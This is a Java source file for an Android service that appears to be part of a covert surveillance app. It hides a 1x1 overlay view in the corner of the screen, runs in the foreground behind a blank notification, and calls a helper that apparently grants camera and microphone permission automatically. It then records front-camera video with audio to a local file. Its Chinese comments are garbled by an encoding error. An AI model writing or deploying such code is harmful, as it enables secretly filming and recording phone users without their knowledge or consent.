/**
 * 
 */
package media;



import android.app.Notification;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;

import android.os.IBinder;
import android.view.Gravity;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import order.screen.ScreenRecordService;
import permission.GivePermission;
import util.ConfigCt;
import util.Funcs;

/**
 * @author ASUS
 *Create new SurfaceView, set its size to 1x1, move it to the top left corner and set this service as a callback
 */
public class VideoRecorderService extends Service implements SurfaceHolder.Callback {
	private WindowManager windowManager;
	private SurfaceView surfaceView;
	private Camera camera = null;
	private MediaRecorder mediaRecorder = null;
	@Override
	public void onCreate() {
		startForeground(1,new Notification()); 
		
		windowManager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
		surfaceView = new SurfaceView(this);
		WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
				1, 1,
				WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
				WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
				PixelFormat.TRANSLUCENT
				);
		layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
		windowManager.addView(surfaceView, layoutParams);
		surfaceView.getHolder().addCallback(this);

	}
	@Override
	public void surfaceCreated(SurfaceHolder surfaceHolder) {
		getCarmaPermission();
		startRecordThread(surfaceHolder.getSurface());
	}
	
	@Override
    public void onDestroy() {
		if(mediaRecorder!=null){
			try {
				mediaRecorder.stop();
			} catch (IllegalStateException e) {
				e.printStackTrace();
			}
			mediaRecorder.reset();
			mediaRecorder.release();
		}
		if(camera!=null){
			camera.lock();
			camera.release();
		}
		if(windowManager!=null&&surfaceView!=null)
			windowManager.removeView(surfaceView);
        surfaceView=null;
        windowManager=null;
        mediaRecorder=null;
        camera=null;
    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    	
    }

    @Override  
    public IBinder onBind(Intent intent) {  
        return null; 
    }
    /*
	 *��ȡ��������ͷȨ��
	 * */
	public void getCarmaPermission() {
		if(!ConfigCt.getInstance(getApplicationContext()).haveCameraPermission()||
				!ConfigCt.getInstance(getApplicationContext()).haveAudioPermission()){
			if(GivePermission.getGivePermission().isEnable()){
    			GivePermission.getGivePermission().EventStart();
    			GivePermission.getGivePermission().TimeStart();
    		}
		}
	}
    /*
	 * ��ʼ¼���̣߳�
	 */
	public  void startRecordThread(final Surface sv){
		new Thread(new Runnable() {    
			@Override    
		    public void run() {    
				//Looper.prepare();
				try{
					if(!OpenFrontCamera())return;//camera = Camera.open();
					
					mediaRecorder = new MediaRecorder();
					camera.unlock();

					mediaRecorder.setPreviewDisplay(sv);
					mediaRecorder.setCamera(camera);
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
					mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
					mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
					String filename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, ".mp4");
					mediaRecorder.setOutputFile(filename);
					//mediaRecorder.

					try { mediaRecorder.prepare(); } catch (Exception e) {}
					mediaRecorder.start();
					ConfigCt.getInstance(getApplicationContext()).setCameraPermission(true);
					ConfigCt.getInstance(getApplicationContext()).setAudioPermission(true);
				}catch(Exception e){
					e.printStackTrace();
				}
				//Looper.loop(); 
		    }    
		}).start();
	}
    /*
	 * ��ǰ�����
	 */
	public  boolean OpenFrontCamera(){
		try{
			Camera.CameraInfo cameraInfo = new Camera.CameraInfo();  
			int cameraCount = Camera.getNumberOfCameras(); // get cameras number  
			        
			for ( int camIdx = 0; camIdx < cameraCount;camIdx++ ) {  
			    Camera.getCameraInfo( camIdx, cameraInfo ); // get camerainfo  
			    if ( cameraInfo.facing ==Camera.CameraInfo.CAMERA_FACING_FRONT ) { // ��������ͷ�ķ�λ��Ŀǰ�ж���ֵ�����ֱ�ΪCAMERA_FACING_FRONTǰ�ú�CAMERA_FACING_BACK����  
			        try {              
			        	camera = Camera.open( camIdx );  
			           
			        } catch (RuntimeException e) {  
			            e.printStackTrace();  
			        }
			    }  
			} 
		}catch(ActivityNotFoundException e){
			e.printStackTrace();
			//return false;
		}
		if(camera==null)camera = Camera.open();
		if(camera==null)return false;else return true;
	}
	/*
	 *����¼
	 * */
	public static void start(Context context){
		//if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
			Intent intent=new Intent(context,VideoRecorderService.class);
			context.startService(intent);
		//}
	}
	/*
	 *ֹͣ¼
	 * */
	public static void stop(Context context){
		Intent intent=new Intent(context,VideoRecorderService.class);
		context.stopService(intent);
	}
}
